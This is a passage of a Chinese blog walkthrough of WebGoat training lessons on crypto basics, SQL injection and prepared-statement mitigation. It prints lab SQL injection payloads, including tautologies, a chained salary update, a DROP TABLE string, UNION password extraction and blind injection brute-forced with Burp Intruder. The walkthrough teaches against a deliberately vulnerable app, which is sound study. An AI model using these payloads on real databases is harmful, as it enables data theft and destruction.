src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/13.png" alt="13">****</p><h4 id="3-Other-Encoding">3.Other Encoding</h4><p>这里介绍的其实是IBM WebSphere Application Server 使用特定的 XOR 编码实现将密码存储在配置文件中，用WebSphere解密才行</p><p><a href="https://www.sysman.nl/wasdecoder/">WebSphere Password Decoder (sysman.nl)</a></p><p>答案这个是我上网搜的</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/14.png" alt="13"></p><p>不知道为什么我的没有用，503了。。。估计是对面服务器的问题</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/15.png" alt="15"></p><p>下面再给个要翻墙的网站，这个我测试了没有问题</p><p><a href="https://strelitzia.net/wasXORdecoder/wasXORdecoder.html">strelitzia.net</a></p><h4 id="4-Hashing">4.Hashing</h4><p>这题的意思是要你现根据下面散列值的长度判断是哪种hash算法，再解密</p><p>但是我们用合适的工具就行了</p><p><a href="https://www.cmd5.com/">md5在线解密破解</a></p><p>输入直接解密就行了</p><h4 id="5-2">5.</h4><p>这题再我不断地看提示和网上大佬的writeup后知道了要干什么（需要使用kali的openssl功能，主要是方便，在其他地方自行下载openssl的包也行）</p><p>首先他给了一个RSA密钥，要我们先用密钥求公钥，然后用公钥取模（第一空），再用sha256签名，再用base64加密</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">openssl rsa: 这是openssl工具的一个子命令，用于处理RSA密钥。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="keyword">in</span> test.key: 这指定了输入文件，其中包含私钥。在这个例子中，私钥存储在名为test.key的文件中。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-pubout: 这是一个标志，表示要输出公钥。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&gt; test.pub: 这将输出重定向到名为test.pub的文件中。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="keyword">in</span> test.pub: 这指定了输入文件，其中包含公钥。在这个例子中，公钥存储在名为test.pub的文件中。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-pubin: 这是一个标志，表示输入文件包含的是公钥。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-modulus: 这是一个标志，表示要输出模数。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-noout: 这是一个标志，表示不输出密钥本身，只输出模数。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在<span class="built_in">echo</span>命令中，-n选项用于抑制自动添加的换行符。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">openssl dgst -sign key -sha256 | <span class="built_in">base64</span> 使用openssl的dgst命令（数据摘要和哈希工具）对输入进行签名。这里使用SHA-256哈希函数和一个私钥test.key进行签名，并将结果用<span class="built_in">base64</span>加密</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1.生成公钥</span></span><br><span class="line">openssl rsa -in test.key -pubout &gt; test.pub </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2.获得模</span></span><br><span class="line">openssl rsa -in test.pub -pubin -modulus -noout</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3.用sha256签名，再用<span class="built_in">base64</span>加密</span></span><br><span class="line">echo -n &quot;***&quot; | openssl dgst -sign key -sha256 | base64</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/17.png" alt="17"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/18.png" alt="18"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/16.png" alt="16"></p><h4 id="8">8.</h4><p>这题需要下载docker，我懒得下载直接去找的答案</p><p><a href="https://blog.51cto.com/hvvyxs/5271326">【WebGoat通关思路】General / Crypto Basics_51CTO博客_webgoat通关攻略</a></p><p>答案是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.Leaving passwords in docker images is not so secure</span><br><span class="line">2.default_secret</span><br></pre></td></tr></table></figure><h3 id="6-Writing-new-lesson">6.Writing new lesson</h3><p>主要是介绍叫你如何自己创造一道题目，这里我也直接给出答案</p><p><a href="https://www.cnblogs.com/lusuo/p/17711367.html">webgoat通关流程 - 让-雅克-卢梭 - 博客园 (cnblogs.com)</a></p><p>第一空是<code>secr37Value</code>，第二空随意</p><h2 id="3-Injection">3.Injection</h2><h3 id="1-SQL-Injection-intro">1.SQL Injection(intro)</h3><h4 id="2-2">2.</h4><p>尝试检索员工 Bob Franco 的部门。 请注意，您已在此分配中被授予完全管理员权限，无需身份验证即可访问所有数据。</p><p>（简单的mysql语法练手）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select department from Employees where userid=96134;</span><br></pre></td></tr></table></figure><h4 id="3-2">3.</h4><p>将 Tobi Barnett 的部门更改为“销售”。 请注意，您已在此分配中被授予完全管理员权限，无需身份验证即可访问所有数据。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update employees set department=&#x27;Sales&#x27; where first_name=&#x27;Tobi&#x27;;</span><br></pre></td></tr></table></figure><h4 id="4-2">4.</h4><p>现在尝试通过将列 “phone” （varchar（20）） 添加到表 “employees” 来修改架构。:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table employees add column phone varchar(20);</span><br></pre></td></tr></table></figure><h4 id="5-3">5.</h4><p>Try to grant rights to the table to user :grant_rightsunauthorized_user</p><p>给用户unauthorized_user赋予操作表grant_rights的权限。这里没有限制需要什么权限，我们把CRUD的权限都赋予用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete on grant_rights to unauthorized_user;</span><br></pre></td></tr></table></figure><h4 id="9">9.</h4><p>Try using the form below to retrieve all the users from the users table. You should not need to know any specific user name to get the complete list.</p><p>尝试使用下面的表格从用户表中检索所有用户。您不需要知道任何特定的用户名即可获取完整列表。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user_data WHERE first_name = &#x27;John&#x27; AND last_name = &#x27;Smith&#x27; or &#x27;1&#x27; = &#x27;1&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个查询之所以会返回所有字段，是因为 or <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1&#x27;</span> 这一部分始终为真。对于任何数据库来说，比较两个字符串 <span class="string">&#x27;1&#x27;</span> 和 <span class="string">&#x27;1&#x27;</span> 都是相等的，所以这个条件总是满足的。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">意味着，不管 first_name 和 last_name 的值是什么，只要它们满足给定的条件，或者 <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1&#x27;</span> 这一条件满足，记录就会被选中。</span></span><br></pre></td></tr></table></figure><h4 id="10">10.</h4><p>使用下面的两个输入字段，尝试从用户表中检索所有数据。</p><p>警告：这些字段中只有一个容易受到 SQL 注入的影响。您需要找出哪个，才能成功检索所有数据。</p><p>通过使用<code>1 and 1=1</code>发现User-Id是注入点</p><p>Login_Conut:1</p><p>User_id:1 or 1=1</p><h4 id="11">11.</h4><p>你是一位名叫约翰·史密斯的员工，在一家大公司工作。 公司有一个内部系统，允许所有员工查看自己的内部数据，例如他们工作的部门和他们的薪水。</p><p>系统要求员工使用唯一的身份验证 TAN 来查看其数据。<br>您当前的 TAN 是 3SL99A。</p><p>由于您总是渴望成为收入最高的员工，因此您希望利用该系统，而不是查看自己的内部数据，而是查看所有同事的数据以检查他们当前的工资。</p><p>使用下面的表格，并尝试从 employees 表中检索所有员工数据。您无需知道任何特定名称或 TAN 即可获得所需的信息。<br>您已经发现，执行请求的查询如下所示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT * FROM employees WHERE last_name = &#x27;&quot; <span class="operator">+</span> name <span class="operator">+</span> &quot;&#x27; AND auth_tan = &#x27;&quot; <span class="operator">+</span> auth_tan <span class="operator">+</span> &quot;&#x27;&quot;;</span><br><span class="line"># <span class="string">&#x27;&quot; + name + &quot;&#x27;</span>赋值之后是<span class="string">&#x27;smith&#x27;</span>因为<span class="operator">+</span>再&quot;中变成了连接符连接&#x27;，如果去掉+和&quot;，name会单纯成为字符串</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Employee Name:Smith&#x27; or 1 = 1 --</span><br><span class="line">Authentication TAN:123</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--在sql是注释后面语句，Authentication TAN为什么都没有关系</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">但是我在Authentication TAN也使用相同的手法但是没有成功，说明这里不是注入点</span></span><br></pre></td></tr></table></figure><h4 id="12">12.</h4><p>Query chaining is exactly what it sounds like. With query chaining, you try to append one or more queries to the end of the actual query. You can do this by using the ; metacharacter. A ; marks the end of a SQL statement; it allows one to start another query right after the initial query without the need to even start a new line.</p><p>It is your turn!<br>You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.<br>Better go and change your own salary so you are earning the most!</p><p>Remember: Your name is John Smith and your current TAN is 3SL99A.</p><p>查询链接顾名思义。使用查询链接，您可以尝试将一个或多个查询追加到 实际查询。您可以使用 ; 元字符来执行此操作。A ;标记 SQL 语句的结尾;它允许在初始查询之后立即启动另一个查询，甚至不需要开始新行。</p><p>轮到你了！<br>你刚刚发现 Tobi 和 Bob 似乎都比你赚更多的钱！ 当然，你不能就此罢休。<br>最好去改变你自己的工资，这样你赚得最多！</p><p>请记住：您的名字是 John Smith，您当前的 TAN 是 3SL99A。</p><p>和上题一样，第二空填不填都无所谓</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27;;update employees set salary=144514 where auth_tan=&#x27;3SL99A&#x27;--</span><br></pre></td></tr></table></figure><h4 id="13">13.</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;drop table access_log;--</span><br></pre></td></tr></table></figure><h3 id="2-SQL-injection-advanced">2.SQL injection(advanced)</h3><h4 id="3-3">3.</h4><h5 id="第一种写法">第一种写法</h5><p>第一空</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; UNION SELECT userid,user_name, password, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, 1 from user_system_data --</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">完整语句</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在SQL中，UNION操作符用于合并两个或多个SELECT语句的结果集。这些SELECT语句可以来自同一个表，也可以来自不同的表。在这个例子中，第一个SELECT语句是来自user_data表，而第二个SELECT语句是来自user_system_data表。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第二个SELECT语句中，你选择了user_name和password字段，并添加了一些常量值（如1和<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>）。这些常量值并不是来自user_system_data表的字段，而是为了满足UNION操作符的要求而添加的。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在UNION操作中，每个SELECT语句必须具有相同的列数，并且相应的列必须有兼容的数据类型。因此，如果你想将两个查询的结果合并在一起，你需要确保第二个查询的列数与第一个查询匹配。在这里，第一个查询选择了所有列，所以第二个查询也需要选择相同数量的列。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这些常量值在结果集中不会产生实际的数据，因为它们与查询的实际结果不匹配。它们仅仅是为了满足UNION的结构要求。</span></span><br></pre></td></tr></table></figure><p>发现密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passW0rD</span><br></pre></td></tr></table></figure><h5 id="第二种写法">第二种写法</h5><p>原理其实都一样。。。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; UNION SELECT 1,udt.user_name,udt.password,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,5 FROM user_data ud RIGHT JOIN user_system_data udt ON ud.userid=udt.userid;--</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Smith<span class="string">&#x27;：这部分尝试匹配user_data表中last_name为&#x27;</span>Smith<span class="string">&#x27;的记录。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">UNION：这是一个SQL操作符，用于合并两个或多个SELECT语句的结果集。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">SELECT 1,udt.user_name,udt.password,‘2’,‘3’,‘4’,5：这部分是第二个SELECT语句，它从user_system_data表中选择数据。这里选择了user_name和password字段，并添加了一些常量值（1, &#x27;</span>2<span class="string">&#x27;, &#x27;</span>3<span class="string">&#x27;, &#x27;</span>4<span class="string">&#x27;, 5）。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">FROM user_data ud：这部分指定了第一个SELECT语句的来源表，即user_data，并给它起了一个别名ud。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">RIGHT JOIN user_system_data udt ON ud.userid=udt.userid;：这部分是一个连接操作。它试图将user_data表（别名为ud）与user_system_data表（别名为udt）进行右连接，连接条件是两个表中的userid字段相等。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">--：这是SQL中的注释符号，用于隐藏注入的SQL代码，使其更难以被数据库检测到。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">整体上，这段代码的目的是通过SQL注入攻击来获取数据库中敏感的数据。它首先通过&#x27;</span>Smith<span class="string">&#x27;这个条件从user_data表中筛选出与&#x27;</span>Smith<span class="string">&#x27;相关的记录，然后使用UNION操作符将结果与从user_system_data表中获取的数据合并在一起。由于这是一个右连接，它会返回所有在user_data表中的记录，以及与之相关联的user_system_data表中的记录</span></span></span><br></pre></td></tr></table></figure><p>然后输入password就行了</p><h4 id="5-4">5.</h4><blockquote><p>这题我是真的要吐槽啊，题目说了是Tom，结果我抓包的时候修改成tom才有用😅</p></blockquote><p>1.按照题目要求说了漏洞在注册，那么注册的时候抓包</p><p>2.发送到repeater模块利用<code>username_reg=tom'+and+password=1</code>返回的output是none</p><p>而<code>username_reg=tom'+and+passwor=1</code>返回的是错误something went wrong</p><p>说明密码的字段名是password</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/8.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/9.png" alt=""></p><p>3.然后利用<code>username_reg=tom'+and+(length(password) &gt; 10) --</code>判断密码长度</p><p>若正确则返回<code>User &#123;0&#125; already exists please try to register with a different username.</code></p><p>错误则返回你的输入</p><p>结束之后知道长度为23</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/6.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/7.png" alt=""></p><p>4.发送到Intruder模块爆破</p><p>修改username_reg</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tom&#x27; and substring(password,1,1)=’1’--</span><br></pre></td></tr></table></figure><p>先设置好爆破位置，即后面两个1的位置，然后选择第四个集束炸弹（Clusterbomb）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/3.png" alt=""></p><p>进入Intruder/Payloads，payload即是Positions页面的设置好的爆破位置变量，数字默认顺序从左往右递增。</p><p>负载1表示遍历第1至第23位数</p><p>负载2表示第一个变量（负载1）的所有可能性。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/5.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/4.png" alt=""></p><p>进行爆破</p><p>查看长度最小的排序就是密码</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/1.png" alt=""></p><p>然后可以试一个发送个repeater模块</p><p>确实没有问题</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/2.png" alt=""></p><p>但是一次没有收集全所有位数的字母，是因为有些请求出错了，经过多次攻击可以集齐所有位字母。<br>最终答案：thisisasecretfortomonly<br>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23<br>t h i s i s a s e c r e t f o r t o m o n l y<br><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/10.png" alt=""></p><h4 id="6-3">6.</h4><h5 id="1">1.</h5><p>预编译语句（Prepared Statement）和普通语句（Statement）的主要区别：</p><ol><li><strong>参数化</strong>：预编译语句使用占位符来代替实际的值，在执行时再将实际值绑定到占位符上。这样做可以防止SQL注入攻击，因为参数化的值不会被解释为SQL代码的一部分。普通语句则直接将值嵌入到SQL代码中，这可能导致SQL注入风险。</li><li><strong>性能</strong>：对于多次执行的相同SQL结构但不同参数的查询，预编译语句通常比普通语句更快。这是因为数据库只需要解析SQL结构一次，然后可以多次使用已解析的结构来执行查询。普通语句每次执行时都需要解析。</li><li><strong>存储</strong>：预编译语句的结构可以被数据库存储，以便后续重用，但实际的参数值不会被存储。然而，这取决于数据库的实现和配置；有些数据库可能不存储预编译语句的结构。普通语句不会被存储，除非它们被包含在存储过程或触发器中。</li></ol><p>然后看题目</p><ul><li>Solution 1: Prepared statements are statements with hard-coded parameters.（错误）预编译语句不是使用硬编码参数的语句；相反，它们使用占位符来代替参数。</li><li>Solution 2: Prepared statements are not stored in the database.（部分正确但不完全）预编译语句的结构可以被数据库存储，但实际的参数值不会被存储。然而，这个选项的表述可能会引起误解，因为它暗示预编译语句从不被存储，而实际上它们的结构有时会被存储。</li><li>Solution 3: A statement is faster.（错误）这个表述没有指明是哪种类型的语句（预编译的还是普通的），而且在没有上下文的情况下，无法确定哪种类型的语句更快。在重复执行的情况下，预编译语句通常比普通语句更快。</li><li>Solution 4: A statement has got values instead of a prepared statement.（部分正确但不清晰）这个选项似乎在暗示普通语句直接包含值，而预编译语句使用占位符。然而，这个表述不够清晰和准确。</li></ul><p>没有一个选项是完美的答案，但如果必须选择一个最接近的，那么Solution 4在修改后可能最接近正确答案：一个普通语句（非预编译的）直接在SQL代码中包含值，而预编译语句使用占位符并在执行时绑定值</p><h5 id="2-3">2.</h5><p>在SQL语句中，通常使用问号(?)作为参数的占位符。当执行预编译的SQL语句时，可以使用参数化查询将参数值绑定到占位符上。这样做可以防止SQL注入攻击，并提高查询的性能。</p><p>例如，在Python的SQLite库中，可以使用问号(?)作为占位符，并使用参数化查询来绑定参数值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3  </span><br><span class="line">  </span><br><span class="line">conn = sqlite3.connect(<span class="string">&#x27;example.db&#x27;</span>)  </span><br><span class="line">cursor = conn.cursor()  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 创建预编译的SQL语句  </span></span><br><span class="line">query = <span class="string">&quot;INSERT INTO table_name (column1, column2) VALUES (?, ?)&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 绑定参数值  </span></span><br><span class="line">params = (<span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;value2&#x27;</span>)  </span><br><span class="line">cursor.execute(query, params)  </span><br><span class="line">  </span><br><span class="line">conn.commit()  </span><br><span class="line">cursor.close()  </span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>在上面的例子中，问号(?)作为占位符，用于表示将要插入的值的位置。然后使用参数化查询将参数值绑定到占位符上，避免了SQL注入攻击的风险。</p><h5 id="3-4">3.</h5><ol><li><strong>Solution 1: They are not static so they can compile better written code than statements.</strong><ul><li>这个说法并不准确。预编译的语句和普通语句在编译时都有其动态和静态的方面。预编译的语句并不是静态的，但这并不意味着它们能“编译更好的代码”。实际上，预编译的语句主要在执行时更加高效，而不是在编译时。</li></ul></li><li><strong>Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.</strong><ul><li>这个说法是正确的。预编译的语句在首次执行时会被数据库管理系统编译，并且会等待输入。这样的预编译可以提高后续执行的效率，因为数据库管理系统可以重用已编译的版本，而不是每次都重新编译。</li></ul></li><li><strong>Solution 3: Prepared statements are stored and wait for input it raises performance considerably.</strong><ul><li>这个说法有些模糊。预编译的语句可以被存储以便后续重用，但这并不是提高性能的主要原因。更重要的是预编译语句的编译和执行效率。存储预编译的语句可以进一步提高性能，但这并不是预编译的主要优势。</li></ul></li><li><strong>Solution 4: Oracle optimized prepared statements. Because of the minimal use of the databases resources it is faster.</strong><ul><li>这个说法可能只适用于Oracle数据库系统。确实，数据库管理系统（如Oracle）可能会针对预编译的语句进行优化，从而使其执行得更快。这是因为预编译的语句减少了动态SQL带来的性能开销，如语法解析和查询计划生成。但是，这种优化并不适用于所有数据库系统，所以这个说法是有针对性的。</li></ul></li></ol><p>综上所述，最准确和全面的解释是：预编译的语句在首次执行时被数据库管理系统编译，并在后续执行中重用已编译的版本，从而提高性能。这种性能提升是由于避免了重复的解析、优化和编译步骤。此外，一些数据库系统（如Oracle）还针对预编译的语句进行了优化，进一步提高了其性能。</p><h5 id="4-3">4.</h5><ol><li><p><strong>Solution 3</strong>：Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data。</p><p>解释：预编译的语句使用占位符来代替用户输入，确保用户输入与SQL查询的逻辑分离。这意味着用户输入不会被解释为SQL代码的一部分，从而防止了SQL注入攻击。通过使用占位符，数据库系统能够控制和验证输入的格式和类型，有效地防止恶意输入被解释为SQL命令。这种分离确保了代码和数据的安全性，防止了潜在的安全漏洞。</p></li><li><p><strong>Solution 1: Prepared statements have got an inner check to distinguish between input and logical errors.</strong></p><ul><li>这个说法并不准确。预编译的语句本身并没有一个“内部检查”来区分输入和逻辑错误。预编译的语句主要是通过参数化输入来防止SQL注入攻击，而不是通过区分输入和逻辑错误。</li></ul></li><li><p><strong>Solution 2: Prepared statements use the placeholders to make rules what input is allowed to use.</strong></p><ul><li>这个说法也是不准确的。虽然预编译的语句确实使用占位符，但它们并不是用来“制定规则”来决定输入的使用方式。占位符的主要目的是为了安全地处理用户输入，防止SQL注入攻击。</li></ul></li><li><p><strong>Solution 4: Prepared statements always read inputs literally and never mixes it with its SQL commands.</strong></p><ul><li>这个说法部分正确，但也部分误导。预编译的语句确实将用户输入作为字面值处理，而不是将其解释为SQL代码的一部分。但是，这并不意味着预编译的语句“从不混合”输入与SQL命令。实际上，预编译的语句在执行时，会将占位符替换为实际的用户输入，并与SQL命令一起执行。关键在于这种替换是安全的，因为占位符确保了用户输入被当作数据而不是代码处理。</li></ul></li></ol><p>综上所述，预编译的语句通过使用占位符来分离代码和数据，确保用户输入被当作数据而不是代码处理，从而有效地防止SQL注入攻击。</p><h5 id="5-5">5.</h5><p>这段代码试图在表单中输入恶意SQL代码，目的是删除名为&quot;Students&quot;的表。</p><p>现在，我们逐一分析提供的解决方案：</p><ol><li><strong>Solution 1: The table Students and all of its content will be deleted.</strong><ul><li>这个说法是错误的。如果一个恶意用户尝试使用这样的输入，并且数据库没有采取适当的预防措施（例如使用预编译的语句），那么表&quot;Students&quot;及其所有内容将被删除。但是没有提及注册新用户</li></ul></li><li><strong>Solution 2: The input deletes all students with the name Robert.</strong><ul><li>这个说法是不正确的。实际上，这段代码会删除整个&quot;Students&quot;表，而不是只删除名为&quot;Robert&quot;的学生。</li></ul></li><li><strong>Solution 3: The database registers ‘Robert’ and deletes the table afterwards.</strong><ul><li>这个说法也是不正确的。实际上，这段代码会首先尝试将’Robert’插入到某个字段中，然后执行删除&quot;Students&quot;表的命令。</li></ul></li><li><strong>Solution 4: The database registers ‘Robert’ ); DROP TABLE Students;–'.</strong><ul><li>这个说法是正确的。如果数据库没有采取适当的预防措施，这段代码将尝试首先将’Robert’插入到某个字段中，然后执行删除&quot;Students&quot;表的命令。–`部分是为了防止SQL解析器将其余部分视为注释。</li></ul></li></ol><p>最总答案：43234</p><h3 id="3-SQL-Injection-mitigation">3.SQL Injection(mitigation)</h3><h4 id="1-4">1-4</h4><p>介绍如何减小SQL注入的缺陷，使用PreparedStatement</p><p>贴一下源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parameterized Queries - Java Snippet参数化查询（java代码片段）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> bool <span class="title function_">isUsernameValid</span><span class="params">(string username)</span> &#123;</span><br><span class="line">    <span class="type">RegEx</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Regex</span>(<span class="string">&quot;^[A-Za-z0-9]&#123;16&#125;$&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> r.isMatch(username);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.sql.Connection conn is set elsewhere for brevity.</span></span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">RecordSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    pUserName = request.getParameter(<span class="string">&quot;UserName&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( isUsernameValid (pUsername) ) &#123;</span><br><span class="line">        ps = conn.prepareStatement(<span class="string">&quot;SELECT * FROM user_table</span></span><br><span class="line"><span class="string">                                   WHERE username = ? &quot;</span>);</span><br><span class="line">        ps.setString(<span class="number">1</span>, pUsername);</span><br><span class="line">        rs = ps.execute();</span><br><span class="line">        <span class="keyword">if</span> ( rs.next() ) &#123;</span><br><span class="line">            <span class="comment">// do the work of making the user record active in some way</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// handle invalid input &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (...) &#123; <span class="comment">// handle all exceptions ... &#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 